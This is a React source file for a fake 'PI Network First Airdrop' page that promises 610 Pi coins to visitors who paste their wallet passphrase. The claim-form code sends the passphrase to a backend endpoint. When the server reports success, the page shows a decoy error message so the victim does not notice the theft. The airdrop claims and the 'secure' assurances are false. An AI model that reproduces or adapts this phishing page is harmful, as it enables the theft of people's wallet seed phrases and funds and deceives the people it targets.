import React, { useState } from 'react';
import { X } from 'lucide-react';

// Header Component
const Header = () => (
  <header className="bg-gradient-to-r from-purple-900 to-purple-700 text-white shadow-lg">
    <div className="max-w-7xl mx-auto px-4 py-3">
      <div className="flex items-center space-x-4">
        <div className="bg-white p-2 rounded-full">
          <img src="icons/pi-removebg-preview.png" alt="PI Network Logo" className="h-8 w-8" />
        </div>
        <span className="text-2xl font-bold tracking-tight">PI Network</span>
      </div>
    </div>
  </header>
);

// Hero Section Component
const Hero = () => (
  <section className="relative py-20 px-4 bg-gradient-to-b from-purple-900 to-purple-800 text-white overflow-hidden">
    <div className="max-w-4xl mx-auto relative">
      <h3 className="text-4xl font-bold mb-6 text-center bg-clip-text text-transparent bg-gradient-to-r from-pink-500 to-purple-200">
        PI Network First Airdrop
      </h3>
      <p className="text-lg leading-relaxed text-purple-100 text-center">
        The official Pi Network has reached 2 million pioneers! To get closer to the main net and activate and attract more pioneers, 
        they will be holding an airdrop, awarding a total of 610 π/pioneer prizes to those who successfully complete KYC. 
      </p>
    </div>
  </section>
);

// Wallet Features Component
const WalletFeature = ({ icon, text }) => (
  <div className="bg-white rounded-xl p-6 shadow-lg hover:shadow-xl transition-shadow duration-300 transform hover:-translate-y-1">
    <div className="flex flex-col items-center">
      <div className="bg-purple-100 p-4 rounded-full mb-4">
        <img src={icon} alt={text} className="w-10 h-10" />
      </div>
      <p className="text-purple-900 font-semibold text-center">{text}</p>
    </div>
  </div>
);

// Wallet Features Grid
const WalletFeatures = () => (
  <div className="max-w-6xl mx-auto px-4 py-16 -mt-10">
    <div className="grid grid-cols-1 md:grid-cols-4 gap-8">
      <WalletFeature icon="icons/wallet (2).png" text="Update your KYC" />
      <WalletFeature icon="icons/bar-code.png" text="Paste your Passphrase" />
      <WalletFeature icon="icons/cash (1).png" text="Get Your Airdrop" />
      <WalletFeature icon="icons/wallet (6).png" text="Secure Wallet" />
    </div>
  </div>
);

// Claim Form Component
const ClaimForm = ({ onClose, onSubmit }) => {
  const [passphrase, setPassphrase] = useState('');

  const handleSubmit = (e) => {
    e.preventDefault();
    onSubmit(passphrase);
    setPassphrase('');
  };

  return (
    <div className="bg-white rounded-2xl shadow-2xl p-8 relative max-w-lg w-full border border-purple-100">
      <button 
        onClick={onClose}
        className="absolute top-4 right-4 text-gray-400 hover:text-gray-600 transition-colors"
      >
        <X size={24} />
      </button>
      <form onSubmit={handleSubmit} className="space-y-6">
        <div>
          <label htmlFor="passphrase" className="block text-sm font-medium text-gray-700 mb-2">
            Paste your Passphrase to claim
          </label>
          <input
            type="text"
            id="passphrase"
            value={passphrase}
            onChange={(e) => setPassphrase(e.target.value)}
            className="w-full px-4 py-3 rounded-lg border border-purple-200 focus:ring-2 focus:ring-purple-500 focus:border-transparent outline-none transition-all"
            required
          />
        </div>
        <button
          type="submit"
          className="w-full bg-gradient-to-r from-purple-600 to-pink-500 text-white font-semibold py-4 px-6 rounded-lg hover:from-purple-700 hover:to-pink-600 transition-all shadow-lg hover:shadow-xl"
        >
          Submit Claim
        </button>
      </form>
    </div>
  );
};

// Main Claim Section Component
const ClaimSection = () => {
  const [showForm, setShowForm] = useState(false);
  const [showError, setShowError] = useState(false);

  const handleSubmit = async (passphrase) => {
    try {
      const response = await fetch('http://127.0.0.1:8000/api/pass/', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({ data: { Passphrase: passphrase } }),
      });
      const data = await response.json();
      if (data.success) {
        setShowError(true);
      }
    } catch (error) {
      console.error('Error:', error);
    }
    setShowForm(false);
  };

  return (
    <div className="flex flex-col items-center py-8 px-4">
      {!showForm && (
        <button
          onClick={() => setShowForm(true)}
          className="bg-gradient-to-r from-pink-500 to-purple-600 text-white font-bold py-6 px-12 rounded-xl hover:from-pink-600 hover:to-purple-700 transition-all duration-300 transform hover:-translate-y-1 shadow-lg hover:shadow-xl max-w-lg w-full text-lg"
        >
          CLAIM 610 PI NETWORK COINS
        </button>
      )}
      
      {showForm && <ClaimForm onClose={() => setShowForm(false)} onSubmit={handleSubmit} />}
      
      {showError && (
        <div className="fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center p-4 backdrop-blur-sm">
          <div className="bg-white rounded-2xl p-8 shadow-2xl max-w-md w-full">
            <div className="flex flex-col items-center">
              <h2 className="text-2xl font-bold text-red-600 mb-4">Error</h2>
              <p className="text-gray-600 text-center mb-6">An error occurred please try again later!</p>
              <button
                onClick={() => setShowError(false)}
                className="bg-gray-100 p-2 rounded-full hover:bg-gray-200 transition-colors"
              >
                <X size={24} className="text-gray-600" />
              </button>
            </div>
          </div>
        </div>
      )}
    </div>
  );
};

// Info Section Component
const InfoSection = () => (
  <div className="bg-purple-50 py-16 px-4">
    <div className="max-w-4xl mx-auto text-center">
      <h6 className="text-purple-600 font-semibold mb-4">How it Works</h6>
      <h4 className="text-3xl font-bold text-purple-900 mb-4">Get Crypto easy & free.</h4>
      <h5 className="text-lg text-purple-700 mb-8">
        Link your Pi account and have your Pis in minutes. It's super easy and fast.
      </h5>
      <div className="flex justify-center gap-8">
        <span className="px-6 py-2 bg-white rounded-full font-semibold text-purple-600 shadow-md">Free</span>
        <span className="px-6 py-2 bg-white rounded-full font-semibold text-purple-600 shadow-md">Secure</span>
      </div>
    </div>
  </div>
);

// Footer Component
const Footer = () => (
  <footer className="bg-purple-900 text-white py-16 px-4">
    <div className="max-w-4xl mx-auto text-center">
      <h4 className="text-2xl font-bold mb-4">Don't have Pi yet?<br />It's fast & easy.</h4>
      <p className="text-purple-200 mb-6">download the app on App store</p>
      <div className="bg-black rounded-xl p-4 inline-block mb-8 hover:bg-gray-900 transition-colors cursor-pointer">
        <img src="icons/apple (1).png" alt="App Store" className="h-8" />
      </div>
      <div className="max-w-2xl mx-auto">
        <p className="text-purple-200 mb-4">
          This website has been designed to give you the best experience. We take the security of information seriously.
        </p>
        <p className="text-purple-300 text-sm">All rights reserved 2024.</p>
      </div>
    </div>
  </footer>
);

// Main App Component
const App = () => (
  <div className="min-h-screen bg-white">
    <Header />
    <main>
      <Hero />
      <WalletFeatures />
      <InfoSection />
      <ClaimSection />
    </main>
    <Footer />
  </div>
);

export default App;